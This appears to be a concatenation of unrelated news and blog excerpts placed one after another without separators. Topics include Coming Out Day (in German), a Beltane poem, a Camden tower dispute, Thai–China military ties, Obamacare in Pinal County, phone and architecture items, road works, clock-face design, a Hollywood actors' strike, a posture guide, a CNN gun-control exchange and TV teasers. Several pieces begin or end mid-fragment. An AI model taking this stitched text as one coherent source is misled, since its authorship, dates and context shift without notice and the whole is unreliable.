The prime minister said he had discussed North Korea with US Vice-President Mike Pence in an overnight phone call.
However, he would not say if the pair had spoken about the prospect of Australian assistance.
quer-fotographie / flickr) Der Coming-out-Tag wird seit 1988 jedes Jahr am 11. Oktober gefeiert (Bild:
Von Dennis Klein
11. Oktober 2017, 12:25h,
Heute vor 30 Jahren wurde der Grundstein für den Coming-out-Tag gelegt, der inzwischen auf der ganzen Welt begangen wird. Is 11. Oktober 1987 fand in der US-Hauptstadt Washington eine Großdemonstration für die Rechte von Schwulen und Lesben statt, an der sich eine Viertelmillion Menschen beteiligten (laut Veranstaltern waren es sogar eine halbe Million)  darunter auch der legendäre Bürgerrechtler Jesse Jackson und Schauspielerin Whoopi Goldberg. Der erste derartige Marsch hatte es 1979 auf halb so viele Teilnehmer gebracht.
Der Protest von 1987 sollte weitreichende Folgen haben: Der 11. Oktober wurde im Folgejahr zunächst für die US-Szene zum "National Coming Out Day". Das Coming-out sollte auch politisch sein: Denn, so die Aktivisten, wenn Heterosexuelle Schwule oder Lesben in ihrem privaten Umfeld kennen, ist es weniger wahrscheinlich, dass sie homophobe Ansichten vertreten oder an ihnen festhalten.
Anlass war damals freilich, dass eine extrem homophobe Regierung in Washington ihr Unwesen trieb. Die Ignoranz des damaligen Präsidenten Ronald Reagan führte dazu, dass die Aids-Problematik in den USA völlig ignoriert wurde, weil sie ja scheinbar nur schwule Männer betraf  aus diesem Grund sind sogar noch heute die Infektionsraten in Amerika um ein vielfaches höher als in anderen Industriestaaten.
Aktionen in Deutschland
Auch in Deutschland gibt es kleinere Aktionen zum Coming-out-Tag, auch wenn er hier weniger bekannt ist als über dem Atlantik. So stellt etwa in Dortmund die städtische Koordinierungsstelle für Lesben, Schwule und Transidente Teile der Ausstellung "wir lieben" der Münsteraner Künstlerin Lydia Dietrich in der Berswordthalle aus. In Bremen wird anlässlich des Tages die Regenbogenfahne geflaggt  allerdings nur, weil der zuständige Mitarbeiter beim CSD im Sommer krank war und deshalb die Fahne damals nicht wehte (queer.de berichtete).
Die schwarz-grüne Landesregierung in Hessen schickte zudem Glückwünsche: "Anlässlich des Coming-Out-Tages möchte ich allen Lesben, Schwulen, Transsexuellen, Trans* und Inter*personen, die im Laufe des letzten Jahres ihr Coming-Out hatten, sehr herzlich gratulieren", erklärte Antidiskriminierungs-Staatssekretär Kai Klose. Der Grünen-Politiker erklärte, dass "jedes Coming-Out auch die Gesellschaft" vorranbringe. "Vielen Dank für Ihren ganz persönlichen Beitrag!", so Klose.
Staatssekretär Kai Klose dankt allen, die sich geoutet haben
Coming-out-Tag abschaffen?
In den USA gibt es allerdings bereits eine Debatte, den Coming-out-Tag wieder abzuschaffen. So schrieb der offen schwule Professor Matthew H. Birkhold von der staatlichen Universität in Ohio in einem Gastkommentar in der "Washington Post": "In den Achtzigerjahren, wenn viele Leute keinen einzige offen schwule oder lesbische Person kannten, führte Ignoranz und Schweigen zu Homophobie. [ ] Aber Amerika ist ein sichererer Ort im Jahr 2017."
Birkhold führte aus, dass heutzutage die meisten Amerikaner gleichgeschlechtliche Beziehungen als moralisch akzetabel bezeichneten und auch sonst die Akzeptanz und die rechtliche Situation ganz anders sei als in den Achtzigern. Man müsse also seine sexuelle Orientierung als Schwuler oder Lesbe nicht mehr proklamieren  Heteros tun die schließlich auch nicht. Statt durch den zelebrierten Schritt Heterosexualität als Norm zu bekräftigen, sollten sexuelle Minderheiten "ihre Existenz normalisieren" und auf Sichtbarkeit im Alltag setzen, so die Forderung.
Die meisten LGBTI-Aktivisten halten diese Argumentation aber für verfrüht. Immerhin ist trotz der Ehe-Öffnung in den USA und zuletzt auch in Deutschland die Selbstmordrate unter Homosexuellen noch immer höher, auch wenn die Rate mit der fortschreitenden Gleichbehandlung rückgängig zu sein scheint (queer.de berichtete). Zudem gibt es drei Jahrzehnte nach Ronald Reagan wieder eine äußerst LGBTI-feindliche Regierung in den USA; so erlaubte die Trump-Administration religiösen Menschen ausdrücklich, Homo- und Transsexuelle zu diskriminieren. In Deutschland kopieren wir wie so oft den Trend aus Amerika: So brachte die AfD in den letzten Jahren offene Homophobie zurück in die Parlamente. Es dürfte also wohl noch ein paar Jahre dauern, bis der Coming-out-Tag überflüssig wird.

Happy Beltane (May Day) Poem
Between the twilight of spring and summer
The hunter has come for the may queen
In fields of gold and beds of flower
He plows her land, so fertile and green
Erect the may pole
So we may dance
The hunter has come, God is here!
His crown the golden disk of sun
Reigning in summer yet another year.
ABOUT BELTANE (MAY DAY)
Happy Beltane, May Day and Walburg to all! Today is a festival of fertility. It is the liminal transition from spring to summer. There is some debate about the meaning of the word “Beltane” itself, some scholars believe it is a reference to the Celtic God “Bel” and “taine” which means fire. So literally the word means “Bel's Fire.” In Pagan times, Beltane Fires were lit to encourage the sun's warmth. It is likely that Bel himself was a fire deity, a patron of the flame and the sun's restorative powers. On Beltane Eve all fires were extinguished and then lit again on Beltane day. The fire celebrated the return of life and the fruitfulness of the Earth. It was believed that these fires could heal, protect and purify anyone who jumped over their flames.
This is a day when the light half of the year is waxing and everything is growing and blooming. It is the last of the Spring Fertility festivals and a time to prepare for the warmer months ahead. The May Queen as well as the Roman Goddess Flora were ways to represent the Divine Feminine aspect of this day. The Divine Masculine emerges as The May King or “Jack in the Green.” This tradition was celebrated throughout Europe (even through Christian times until the Puritans tried to stop it.) Many towns and villages would erect a May Pole and dance around it with ribbons. The pole has an obvious phallic imagery (the potent sexual God) and the ribbons are said to represent the Goddess, who is wrapping herself around this phallus. Many people say that Beltane or May Day represents the Divine Marriage between “The God and Goddess.” While ancient Pagan people had more than just one God and Goddess, perhaps this modern reinterpretation means that it is a marriage between the masculine and feminine aspects of life.
This day is traditionally celebrated with dancing around the May Pole, jumping over bonfires, mating, sword dances, archery, feasting, drinking, music and other types of fun debauchery.

Outrage as Camden planners give go-ahead for ‘monstrous' Swiss Cottage skyscraper
An artist's impression of the new Swiss Cottage tower in Avenue Road Archant
Thousands of residents fighting a fierce battle against plans to build one of the highest towers in Camden could see their campaign amount to nothing after council planners have recommended granting permission for the scheme.

"This is a monstrous proposal that is completely out of keeping with the area. We hope councillors listen to the thousands who have objected. We urge residents to join us at the meeting" Sarah Gottlieb, of Save Swiss Cottage campaign group
Anger over the proposed construction of a £100million 24-storey residential “skyscraper” in the heart of Swiss Cottage – branded “monstrous” and “grotesque” by a former director at English Heritage – has left Camden Council's planning department facing an enormous backlash which will see hundreds of protesters gather outside the Town Hall next Thursday.
A petition attracted 3,000 signatures while about 900 residents submitted letters of objection to the development on the site of the Ham&High's former office, compared to five letters of support received by the council.
But it is feared the overwhelming opposition could amount to nothing after planning officers revealed yesterday that they would be advising councillors to grant planning permission for the project.
It would see the current building at 100 Avenue Road knocked down by developer Essential Living and replaced by a 266 foot tower providing 184 flats, 36 of them “affordable”, along with retail and a community space.

Adding to concerns about the height, design and overcrowding, the building will also include a separate entrance for poorer residents – which have been controversially dubbed “poor doors”.
A final decision on the plans will be made by councillors at a public meeting next Thursday.
Sarah Gottlieb, of campaign group Save Swiss Cottage, said: “This is a monstrous proposal that is completely out of keeping with the area. We hope councillors listen to the thousands who have objected. We urge residents to join us at the meeting.”
Essential Living has championed the project, saying it would bring to Swiss Cottage a “much enhanced town centre”.

But on Friday, campaigners handed over a scathing report to the council, written by a former planning and development director at English Heritage.
In his 33-page assessment, Philip Davies, who co-authored English Heritage's Guidance on Tall Buildings, described the tower as a “monstrous proposal, which is grotesquely out of scale with its surroundings”.
The report added: “It would cause substantial damage to the setting of the surrounding conservation areas and the individual heritage assets with them.”
Conservation group the Heath and Hampstead Society also waded in, saying the tower would lead to more high buildings being granted planning permission, creating what it dubbed a “Northern Canary Wharf”.
Campaigners find themselves pitched against a number of public and private organisations that will benefit from the project.
Transport for London (TfL) described the development as a “significant opportunity” to upgrade Swiss Cottage Tube station – a project TfL plans to undertake with financial help from Essential Living.
It is believed that The Winch youth project could be re-housed in the new development, with the existing premises becoming a lucrative addition to the council's property portfolio.
In total, developers will hand over £2million in education, employment, transport and other local contributions.
Scott Hammond, Essential Living managing director, said: “The key conclusions of this report are entirely consistent with the views previously expressed by the Greater London Authority and the Design Council.
“It will deliver new jobs, new spending power, and much needed affordable housing.
“Most of all, it will bring forward what Camden officers have described as a ‘High quality architectural design which makes a positive response to the local context'.”
The Development Control Committee meets at Camden Town Hall, Judd Street, next Thursday, September 11 at 6.30pm.

Recent military agreements between Thailand and China are sparking speculation about the depth of their defense cooperation.
Chinese Defense Minister and State Councilor General Chang Wanquan and his Thai counterpart, Prawit Wongsuwan, held talks this week on the sidelines of the ASEAN Defense Ministers meeting in Laos.
Analysts say the meeting confirms that recent agreements are designed to strengthen cooperation; but they caution Thailand is unlikely to become overly dependent on Beijing for its military needs.
The agreements, negotiated between Thailand's National Security Council and China's intelligence agencies, covered strengthening military contacts, education, technology and development as well as bolstering joint efforts of the Expert Working Group for Counterterrorism.
Panitan Wattanayagorn, a political scientist and adviser to General Prawit, said the talks highlighted Thailand's broadening of cooperation with major powers.
“The meeting reconfirmed and set clear activities based on those agreements in the last few months. It suggested that Thailand's cooperation with major powers has been updated and have been brought to the new era,” Panitan said.
“This is significant as Thailand is increasingly enjoying more areas and more activities with major countries, including of course the United States, Japan, India, Russia and of course China in this case,” he said.
US policy sparks shifts
The Thai military, since taking power in 2014, initially turned to China as an alternate source to meet military and security needs after its traditional ally, the United States, reduced military cooperation following the May coup. Prawit, who is also deputy prime minister, has had several rounds of talks with China's senior military figures in the past two years.
Analysts, however, say Thailand has also reached out to Russia and Europe to strengthen security ties. Prime Minister Prayut Chan-o-cha has held top level talks with both China and Russia to strengthen security ties and arms purchases.
Thailand's navy is looking to purchase three Chinese-made S26 T Yuan Class submarines, while the Thai army purchased 28 VT4 battle tanks, also from China, with an option to buy a further 153 vehicles.
The Thai army, meanwhile, is looking to buy 12 Russian-made MI-17 helicopters instead of the traditional U.S.-made Black Hawks, which the Thai Army says are "too expensive."
Carl Thayer, a defense analyst with Australia's University of New South Wales, said the Thai shift to procure weapons from China and Russia, together with European suppliers, is a direct outcome of the U.S. policy to halt sales to Thailand after the coup.
“Thailand with its needs to upgrade, it's found it with Russia; sounding on with China has always been a part of the game that Thailand has played,” Thayer said.
“[Russia] wants its agricultural produce to get to the Thai market and this is a consequence, and I'm making no judgement of American policy to read negatively and perhaps heavy handedly when a country undemocratically changes its political system and that country is then left isolated,” he said.
The Thai military's budget in 2016 is around $5.8 billion, accounting for almost 8 percent of total budget spending, with the current amount marking a 7 percent increase from last year.
Other sectors involved
Somphob Manarangsan, a political scientist and specialist on Thai-China relations, said despite the agreements, bilateral relations between the two countries have cooled in the past year.
Somphob said a breakdown in talks between Thailand and China over a $15.7 billion, 845-kilometer high speed rail line marked a step back in ties.
The Thai government announced the cancellation of the project in March. Analysts say the talks' failure centered on investment sharing, total cost, as well as interest on concessionary loans.
Somphob said Thailand is looking to broaden its security and economic ties. “They could not put through that railway linkage project between China and Thailand. And currently Thailand is trying to liberate itself to come closer to Japan and some other countries and not only with China,” he said.
“I sense that Thailand is trying to have military ties with several countries, like with Russia, with the USA and also with China. With the USA, we still have the Cobra Gold [joint military] exercise every year,” he said.
Somphob says Thailand is unlikely to become more militarily dependent on China. The Thai people prefer to be, he said, “well balanced among the superpowers.”
“That's very important for Thailand, economically, politically or for security, particularly for the security,” he said.
An Arizona county is poised to become an Obamacare ghost town because no insurer wants to sell exchange plans there.
Aetna's recent announcement that it would exit most of the states where it offers Obamacare plans leaves residents of Pinal County, Arizona, without any options to get subsidized health coverage next year, unless regulators scramble to find a carrier to fill the void between now and early October.
Story Continued Below
About 9,700 people in Pinal signed up for Obamacare plans this year, according to administration data.
The predicament of Pinal County is an extreme example of the contraction of insurers in the Obamacare markets expected in 2017. The federal health care law was supposed to offer a range of affordable health care plans through competition among private insurers. But that competition has dramatically declined in some states as a result of pullbacks by national insurers and failed co-op plans. Decline in competition means fewer choices and, often, higher prices for consumers.
Nearly 1 in 5 potential Obamacare customers may have just one insurer selling plans in their communities — up from just 2 percent of customers who had one option this year, according to the McKinsey Center for U.S. Health System Reform.
But in Pinal County, a rural community within the Phoenix metropolitan area, many may lose health care coverage altogether.
“If you have a several-hundred-dollar-a-month subsidy available and you lose that, that's going to be huge,” said Thomas Schryer, director of the Pinal County Public Health Services District.
He predicted that many Pinal residents would be unable to afford more costly insurance plans outside the Obamacare marketplace and were likely to roll the dice and go without coverage — something that will be far more risky for those with chronic health problems or who are in the middle of treatments.
Arizona's Obamacare marketplace had previously offered plans sold by national insurers like UnitedHealth Group and Humana, as well as by a nonprofit co-op plan seeded with Obamacare loans. But the co-op collapsed, and United and Humana, like Aetna, are leaving the exchange. Other companies, like Blue Cross Blue Shield of Arizona, are scaling back their presence.
“It's a dramatic case of a more general thing: There are weaker markets that are going to be less attractive for carriers,” said Katherine Hempstead of the Robert Wood Johnson Foundation.
It isn't entirely clear why insurers are fleeing this particular county, which had about an 18 percent poverty rate in 2014 — higher than the roughly 15 percent for the country as a whole but not extreme. Median household income was around $50,250, according to the Census.
Yet there are higher rates of adult obesity, physical inactivity and teen births in Pinal County compared with statewide figures, according to data from the Robert Wood Johnson Foundation. A shortage of health providers is also acute, with only one primary care doctor for every 6,700 people.
“The reason why it's empty is because nobody wants to be there,” one insurance industry source said of Pinal County. “The only thing a [regulator] can do is beg.”
Although Pinal experienced a population boom in the 2000s, it doesn't have much of an economic base, so most people work and likely receive their health care in nearby Phoenix, according to Arizona State University professor Tom Rex.
“The health care infrastructure often takes many years to catch up with the population,” said Schryer.
Begging on behalf of Obamacare can be politically problematic in a red state like Arizona, where Obamacare has been a prominent feature of at least one reelection campaign in the current cycle. Sen. John McCain has made it a centerpiece of his bid for another term.
Such was the case in Mississippi in 2013, when state Insurance Commissioner Mike Chaney had to convince an insurer to offer plans in 36 counties that had no options ahead of the first open enrollment period. Chaney said federal regulators helped the state because it was “very unpopular” for a Republican to help recruit someone to cover the entire state. Humana eventually agreed to sell on the exchange in those counties, and it's still there.
“What we're having to do now to keep companies in our state to cover all of the counties is to grant some pretty heavy rate increases,” Chaney said in a recent interview.
Health policy experts say that Blue Cross Blue Shield of Arizona would be the most likely to sell plans in Pinal if regulators can coax it back. The company had offered plans in the county this year but decided to drop its offerings there, as well as in neighboring Maricopa County, where Phoenix is located, according to its 2017 rate filings.
The company has said that in light of Aetna's exit, it is re-evaluating where it will offer plans next year. But an agreement to return would likely come at a price. BCBS of Arizona had initially requested a rate increase of 65 percent on average for individual plans, when Maricopa and Pinal counties were part of its filing. When it dropped those counties, the company revised its proposed increase to 51 percent.
Aetna initially submitted an 18 percent rate increase for its individual plans on the exchange. It later jacked up its requested rate increase to 86 percent, before pulling out entirely.
Trish Riley, executive director of the National Academy for State Health Policy, said regulators have discretion in setting coverage rules but few things can be done quickly. Agreeing to look at rates again would offer an incentive to insurers to participate, she said.
“What are your options?” she said of state regulators. “Disenfranchised consumers are going to sue you. People aren't going to get coverage. Those aren't good options.”
In the long term, Riley said the recent spate of insurance company exits should spur a broader conversation about strategies to stabilize the exchanges.
“I think this is a wake-up call,” she said.
But state Insurance Department spokesman Stephen Briggs offered a different perspective, saying regulators “are not scrambling” to find another company. He also dismissed the notion that regulators might grant higher rate increases to an insurer if it agreed to serve Pinal. He said the department is still reviewing plan rates for 2017 and final rates would be released in September.
“The decision to really offer a product is a business decision that the company still has the right to make,” he said.

HTC told announcement a couple of days ago that we should see an Android 4.3 update for the HTC One Developer Edition before the end of the week. That update is now rolling out to both the Developer Edition and Unlocked variant of the phone here in the U.S. as build 3.22.1540.1. As you can see in the image above, my unlocked version is a part of the rollout.
The update jumps the device from Android 4.1.2 to Android 4.3, which means it receives all of the goodies introduced in Android 4.2, like quick toggles in the notification bar. But the bigger deal here is likely what HTC has done with Sense 5 enhancements, which range from new Highlights options to swiping up on Home to access Google Now. We'll be diving in as soon as this installs finishes up and will report back on our findings.

The Torre Telefónica Chile. Wikipedia Commons
Phone design evolves quickly. It's hard to imagine what the iPhones and Galaxies of the 2030s will look like.
If you're having trouble remembering what cell phones used to look like, look no further than the Torre Telefónica in Santiago, Chile. Located in the city's center, the 470-foot-tall tower is designed to resemble a mobile phone —from the '90s.
Built in 1993, the $75 million skyscraper serves as the Chilean headquarters for Movistar, a popular phone company in Latin America. Phone-inspired architecture for a telecommunications company's offices — makes sense, right?
To its architect, Mario Paredes, the Torre's design likely seemed like a good idea at the time. In the early '90s, box phones were considered one of the most innovative mobile phones, since they were so small that they could fit in your pocket.
But in the 21st century, the skyscraper is now a bit of a cringe-worthy (though nostalgic) eyesore. Let it be a lesson that architects probably shouldn't design permanent structures to look like pieces of rapidly changing technology.
Mount Keira Road will reopen to traffic on Monday 25 August following $2.4 million of stabilisation and hazard reduction work.
The road, a popular tourist route, has historically been susceptible to natural hazards like rockfalls and landslides. Following geotechnical investigations in 1998 that identified a number of sections were considered to be high risk, Council has been working to reduce the risk and improve the road surface. The last and most complex stage has been completed this month.
The project included work on the lower embankment, the upper slopes, and the roadway, to address a number of issues, explained Senior Geotechnical Engineer Peter Tobin.
“The road itself was constructed many decades ago and used a ‘cut and fill' technique that was typical back then for mountain pass construction. Unfortunately it didn't really create the support that was needed and over the years the fill started to settle. When we started this stage of the project the road cross fall was sloping at about 16 degrees. A normal cross fall is 2 to 3 degrees.”
5 rows of rock anchors were implanted into the lower embankment, fixing it to the bedrock. The area was then meshed and the concrete edge was reconstructed. This method allowed the road to also be widened by another 1.5 metres, improving safety and line of sight for motorists.
“On the upper slope, a weathered sandstone cliff face, the work we did was all about reducing the rock fall hazard. We cleared vegetation and loose rocks, installed rock bolts in boulders, applied shotcrete to some areas and built catch fences,” said Mr Tobin.
Installation of guardrail and the application of the initial road pavement layers is now done in preparation for the reopening, however the final finishing touch will come in October. “As with almost all road resurfacing or reconstruction, it needs to be left for around six weeks to settle before the final asphalt surface layer is put in place so there will be another short closure in October to accommodate this.”
Wollongong City Lord Mayor Councillor Gordon Bradbery OAM inspected the area on Friday and commended staff on their work “This was a delicate and complex project and the staff have done an outstanding job. In fact their efforts and innovation have been recognised just this week at the National Road Stability Industry (Auststab) Conference, where they received the ‘Excellence in Recycling in Stabilised Pavements in Local Government' award.”
He thanked the community for their patience while the essential work was being carried out. “It's been one of the most asked questions over the last 18 months – “When is Mt Keira Road reopening?” and I'm thrilled to now be able to give the answer. The road provides a good secondary access route in and out of Wollongong, so along with being a popular tourist drive, it also is great benefit to our emergency services, which is particularly important heading into the bushfire season”.
Cr Bradbery also revealed Council has submitted a Resources for Regions application for funding for Mt Keira Summit Park.
“We've asked for $3.5 million to help upgrade this popular area. Any funding we receive will be used to design and construct enabling infrastructure, such as high voltage power and water, to the summit park.
Mt Keira Road will reopen to traffic on Monday 25 August at 8.00am.
I recently re-listened to an episode of This American Life titled It'll Make Sense When You're Older. It's another great episode of TAL — a series of segments covering how we deal with our own knowledge at the various stages of our lives.
The segment that struck me is Act Four. Host Chana Joffe-Walt speaks with Carl Duzen and his wife about his Alzheimer's. Carl has a graduate degree in Physics, so the idea that he can no longer draw a simple analog clock has its obvious frustrations. It wasn't until Carl broke down the makeup of the analog clock into the “Superposition of three types” that he understood how it truly worked — meaning he could understand how to read it. He can't read it at a glance like many of us, but with some time he can work it out with the system he's learned.
Listening to them break down the makeup of an analog clock face, Joffe-Walt's frustration is not unwarranted —
“And by the end of all this, I just feel like, what the hell, clock?”
We predominantly read time left-to-right — Hours, Minutes, Seconds — yet a traditional clock face places a level of importance on the minute hand. This is evidenced by Duzen's reaction to first notice the longest hand on the clock. I'd argue that importance then moves to the hour hand given earlier clocks that follow this design pattern often didn't have second hands, followed by the second hand which, when present, is often a far thinner than the others.
“It's a miracle anyone can ever just glance at their wrist and capture information, something Carl works very hard at.”
But is it?
Granted, the numbers 1-12 around a clock clearly don't help Duzen's confusion but what they don't touch on is what I believe to be part of the reason Duzen can't glance at a clock face like the rest of us. He no longer has the context many of us are afforded when we look at a clock face. That context helps us with the first step in reading a clock face — the current time. Since listening to the episode for the first time a year ago, it made me look at my watch differently and I realised that the majority of the time, I'm only looking at my watch for the minutes hand… I generally have an idea of what time of day it is and I'm just looking for an indicator to round me off from what I think it might be.
I'd imagine that was the idea behind the initial design of the more traditional clock face we know today. From sundials to clock towers to analog faces and onwards, our ability to tell time has merely gotten more accurate as we've progressed. But the analog face seems to have developed minutes somewhere around the 15th century, where it seems ringing clock towers were relatively common. Every time we visit my parents' house, I have a more accurate idea of what the time is throughout the day — they have a clock that chimes every hour which gives me just enough context when I later glance at my watch. I can't help but feel that this might have been part of the driver of making the minute hand more prominent and is an important lesson when designing anything —
Is the most important thing presented to the user first?
It should always be at the front of any thought about information hierarchy or usability of something. Maybe in its final form it will be confusing for a user at first, but consider their use of it in longevity when designing it — what is the context of the user at that point?
I've been driving a Mazda for a bit over a year and when I first got the vehicle, I found the navigation menu structure seemed like it was thrown together — the order didn't make sense.
It felt like Navigate Home belonged at the top — I couldn't even tell you why I felt like that now — possibly because it seems like such a primary thing. But over time, I'd argue I probably use these different options almost exactly proportionatly to the order they're structured in.
If I need to use the navigation, it's generally because I need to Find [an] Address I need to visit and I need a route. Often enough, but not always, I'll leave that address and need to Navigate Home given I'm probably somewhere new. From time to time, I need to Find Places like nearby petrol stations et al. I have a few saved Favourites — places I often visit but don't often need directions to. Although I'd argue that this might get used as much, or even just a tad more than the above option, there's a button for the favourites next to the physical control in the console.
Ordering of things like this seems pointless. But I didn't notice how well it was structured until I thought about it — and I'm just the sort of person that would end up hating it when I inevitably found it frustrating.
The prevalence of this type of design thinking is growing, but it's still far from the norm. In iOS, the ability for app icons to incorporate a dropdown are another great example. Opening an app is the primary and thus easiest action, but by 3D touching apps that utilise the feature, some of the primary actions can be quickly reached. I've used this with Shazam countless times, as I rarely have any need to open the app itself.
I regularly use the Westpac app and while the app itself isn't bad, it misses out on helping me skip a few steps by not prioritising what I believe would be the primary function for most users. When I click the Pay & Transfer tab, I get the screen on the left. However I'd happily be proven wrong that almost all users would be clicking the tab to actually perform what the tab suggests. So give me the screen on the right, with the option to view upcoming payments.
It's just one little gripe, but can be easily fixed or else becomes one of those things that gets annoying with repetitive use. And when I say little gripe, I mean a tiny gripe.
Don't sweat the small stuff, but get a little exercise.
I can't imagine what it would be like to be in Duzen's position, other than frustrating beyond belief. His story makes you appreciate the difficulty of learning, understanding or teaching anything that we take for granted out of habit or simplicity. But it's an important use case to consider in the design process because we need things to make sense, and be in the right order, to provide the best possible experience.
With a young daughter that will obviously need to — or at least should — learn how to read an analog watch face in a few years, I'm not sure where to start. But I anticipate it being difficult… given that technically, it starts at twelve 🤔.
Matthew Simmons / Getty Actress Julia Louis-Dreyfus, left, and comedian Kathy Griffin picket in support of the Writers Guild of America, which went on strike for increased residuals from film and television profits in 2007
This again?
Just four months after a 100-day writers' strike ground Hollywood to a halt and cost the state of California more than $2 billion and 27,000 jobs, the movie business is once again facing the possibility of a strike  this time by actors. The anticipation of labor unrest in July has kept movie studios from starting production on any big films since April, while TV productions are working double-time to get as many episodes of their fall shows in the can as possible.
The issues (new-media and DVD residuals) are the same ones the writers fought over. But the actors are in the unique position of being represented by two unions that can't stand each other. Those unions  the Screen Actors Guild (SAG) and the smaller American Federation of Television and Radio Artists (AFTRA)  are negotiating their contracts with the Alliance of Motion and Picture Television Producers (AMPTP) separately for the first time in 27 years. AFTRA has reached an agreement that closely mirrors the one writer and directors approved earlier this year; its 70,000 members must vote to approve it by July 8. But SAG, taking a harder line, is still in negotiations with studios and appears to be far from reaching a deal for its 120,000 members by the time their contract expires June 30.
"What we're deciding here will affect actors for a generation," says Doug Allen, SAG's national executive director and chief negotiator. "The notion that the [Directors Guild of America], [Writers Guild of America] and SAG should all get the same deal is not fair. What's good for directors is not necessarily good for actors."
The long-simmering battle between the two unions escalated in March amid allegations that SAG was trying to poach actors from the soap opera The Bold and the Beautiful, which is under AFTRA jurisdiction. Now the fight has gotten to the hair-pulling stage: SAG is attempting to defeat AFTRA's contract vote, which would force the unions back to the bargaining table together. The latest weapon is dueling robo-calls: actor James Cromwell is calling AFTRA's members to support the contract. Sandra Oh is calling the 44,000 actors who are members of both unions to vote to defeat it.
"There's enormous anger against SAG in the industry because there's a feeling that they're not being realistic," says Jonathan Handel, a digital-media attorney at TroyGould in Los Angeles. Although none of the other unions have managed to obtain an increase in DVD residuals, SAG is still pushing for it. But because of the weak economy and the fresh memories of the writers' strike, Handel contends, "they don't have the leverage."
While the actors' unions continue to spar, studios are hedging their bets when it comes to productions. Executives at two movie studios said they had pushed back production start dates to late summer with the SAG negotiations in mind. If there is a strike, the thinking goes, better that it happen before a $100-million movie gets under way.
A special-effects-heavy movie, such as Transformers 2, could switch from filming actors to CGI work if a strike occurred. Meanwhile, one studio is planning a pre-emptive "super junket" for the press  the actors for several of its July and August films are doing their publicity now in case a strike prevents them from working later.
Several high-profile independent films, such as Bad Lieutenant, starring Nicolas Cage, and W, Oliver Stone's chronicle of the Bush presidency, are moving ahead with production, since they have negotiated separate deals with SAG.
How all this will influence TV is murkier. Some fall shows, like NBC's Heroes, ramped up production earlier than usual and have been at work since May. Others, like J.J. Abrams' much-anticipated new Fox show, Fringe, are about to start to production to deliver episodes for a big September promotional push. Fox would not comment on what a strike could mean for its Fringe plans.
Producers say the rancorous SAG negotiations have already hurt Hollywood. "A de facto strike is quickly shutting down production across the industry as SAG's Hollywood leadership stalls for time to pursue its campaign against AFTRA's new contract," says AMPTP spokesman Jesse Hiestand. "For each day that we are without an agreement, the losses continue to mount for the talent, crews, their families and the businesses that rely on the entertainment industry."
Parks and Recreation finally has a new home in the UK.
The final four seasons of Amy Poehler's cult comedy will air on Dave from this summer, after UKTV won the rights from BBC Four.
Seasons 4 and 5 will air on the channel from Monday, July 27, while seasons 6 and 7 will follow in summer 2016.
Alexandra Finlay, Head of Acquisitions for UKTV, said: "We're delighted to extend our partnership with NBCUniversal on this deal.
"As an award-winning comedy with a superb cast, Parks and Recreation is a fantastic addition to Dave's scripted acquisition slate."
Steve North, General Manager for Dave, added: "Parks and Recreation feels like it was written for Dave; the wit and humour fits perfectly on the channel and will be a great addition to the slate."
Nick Offerman, Chris Pratt, Rashida Jones, Aubrey Plaza, Adam Scott, Rob Lowe and Aziz Ansari make up the show's primary cast.
Parks and Recreation aired its last ever episode in the US back in February.
Standing Posture – Common Mistakes & Correction Techniques
In the previous article we discussed how we can correct sitting posture and minimize side effects of prolonged sitting. This article will focus on maintaining a neutral standing posture. Majority of people stand less compared to sitting. Regardless of that it's important to practice it correctly. There are jobs which require standing for prolonged hours. Standing is better than sitting but doing it inappropriately can cause some health concerns.
From the previous two articles, we have almost understood the neutral positions of different joints and cues to correct them. This will make it easier to get into a correct standing posture.
Common Standing posture mistakes
Narrow stance
Excessive weight bearing on one foot
Hyperextended or locked knees
Bent knee specially seen in people wearing high heels
Anterior pelvic tilting (increase low back arch excessively) most commonly seen these days
Flat back – flattening of lower back
Shoulders dropping forward
Forward head – chin poking out
Looking down – eye gaze near feet
Tips and sequencing of correcting posture
Breitbart.com Editor-at-Large Ben Shapiro appeared on CNN tonight and accused host Piers Morgan of “standing on the graves of the children of Sandy Hook” in his pursuit to “demonize” the pro-gun advocates who argue against stricter gun control legislation in the wake of the school shooting.
“You have kind of been a bully on this issue, because of what you do, and I've seen it repeatedly on your show,” Shapiro said immediately out of the gate. “I watch your show. And I've seen it repeatedly. What you tend to do is you tend to demonize people who differ from you politically by standing on the graves of the children of Sandy Hook, saying they don't seem to care enough about the dead kids. If they cared more about the dead kids, they would agree with you on policy.”
He continued to tear into the host: “I think we can have a rational, political conversation about balancing rights and risks and rewards of all of these different policies, but I don't think that what we need to do is demonize people on the other side as being unfeeling about what happened at Sandy Hook.”
Of course, Morgan took issue with such a characterization: How dare you accuse me of standing on the graves of children who died there,” he said. “How dare you.”
“I've seen you do it repeatedly, Piers,” Shapiro insisted.
“Like I say, how dare you,” Morgan replied.
Shapiro did not back down from his criticism, telling Morgan, “Well, I mean, you can keep saying that, but you've done it repeatedly. What you do, and I've seen you do it on your program, is you keep saying to folks if they disagree with you politically, then somehow this is a violation of what happened in Sandy Hook.”
He then challenged the CNN host to present policy ideas as opposed to demonizing his opponents: “I would really like to hear your policy prescriptions for what we should do about guns because you say you respect the Second Amendment,” he said before presenting a pocket version of the Constitution. “I brought this here for you so you can read it,” he said.
“I would really like for you to explain to me what you would do about guns that would have prevented what happened in Sandy Hook,” Shapiro continued. “If you want to do what you did in the U.K., which is ban virtually all guns, that is at least a fair argument and we can have a discussion about whether that's something that we ought to do or not.”
Morgan's response: “I made it clear what I want to do, which is exactly what [retired Rep. Gabrielle Giffords‘ husband] Mark Kelly wants to do. And, in fact, rather than address your comments to me about standing on the graves of children at Sandy Hook, you can address them to Mark Kelly because he agrees with everything I have been saying because he feels the same way, as does his wife.”
After stating that “assault weapons” were used in the four latest nationally-publicized shootings, Morgan said, “You can smirk at me and you can laugh at me, and you can accuse me of standing on the graves of dead children, but that's the reason that people like me and Mark Kelly and Gabrielle Giffords want to have assault weapons like that removed from civilian hands.”
“Your passion on the issue doesn't really justify the rationale for why you want to ban assault weapons,” Shapiro shot back.

Have a tip we should know? tips@mediaite.com
When will The Flash unmask Savitar? Does Once Upon a Time have another Oz-some episode planned? Is three a crowd for Supergirl sweethearts? Read on for answers to those questions plus teases from other shows.
When will we find out who is a Savitar is on The Flash? —Arlena
